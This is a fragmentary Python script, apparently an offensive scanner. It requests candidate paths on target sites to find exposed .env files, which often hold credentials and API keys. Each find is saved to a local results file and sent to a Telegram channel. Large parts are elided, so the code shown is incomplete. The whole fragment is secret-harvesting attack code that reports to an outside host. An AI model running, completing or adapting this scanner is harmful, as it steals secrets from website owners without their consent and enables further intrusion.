...
def is_site_alive(site):
    try:
        resp = requests.get(site, timeout=10, allow_redirects=True)
...
def get_protocol(target):
    ...
    # Try https first
    try:
        resp = requests.get(f"https://{target}", timeout=5, allow_redirects=True)
...
def exploit(target):
    ...
    for read_path in path:
        ...
        try:
            resp = requests.get(exploit_path, timeout=10, allow_redirects=True)
            if resp.status_code == 200 and is_env_file(resp.text):
                if exploit_path not in found_urls:
                    ...
                    with open(f'{RESULTS_DIR}/env.txt', 'a', encoding='utf-8') as f:
                        ...
                        f.flush()
                    findings["ENV"] += 1
                    send_telegram(f"<b>ENV Found</b>\n<code>{exploit_path}</code>", parse_mode="HTML")
